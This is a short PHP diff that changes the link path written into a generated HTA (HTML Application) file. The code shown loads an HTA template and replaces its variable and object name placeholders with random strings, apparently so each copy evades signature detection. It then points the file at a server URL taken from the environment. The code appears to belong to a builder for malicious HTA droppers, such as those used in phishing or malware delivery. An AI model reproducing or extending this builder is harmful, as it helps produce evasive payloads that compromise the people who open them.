@@ -41,7 +41,7 @@ $sHTA = (file_get_contents($path . '/src/model/default_model_hta_DIMAS.txt'));
 $sHTA = str_replace("%hta_var_01%", GeraStringRandomica(rand(3, 8)) . (string)(rand(5000, 2000)) . GeraStringRandomica(rand(2, 5)), $sHTA);
 $sHTA = str_replace("%hta_var_02%", GeraStringRandomica(rand(1, 8)) . (string)(rand(5000, 2000)), $sHTA);
 $sHTA = str_replace("%hta_boj_01%", GeraStringRandomica(rand(1, 8)) . (string)(rand(5000, 2000)), $sHTA);
-$sHTA = str_replace("%htal_link%",getenv('BASE_URL_WITHOUT_HTTP')."/vbc/", $sHTA);
+$sHTA = str_replace("%htal_link%",getenv('BASE_URL_WITHOUT_HTTP'), $sHTA);
 //$sHTA = str_replace("%textrand%", $textrand, $sHTA);
 
  //echo "<!-- " . $sHTA . " -->"; die ;
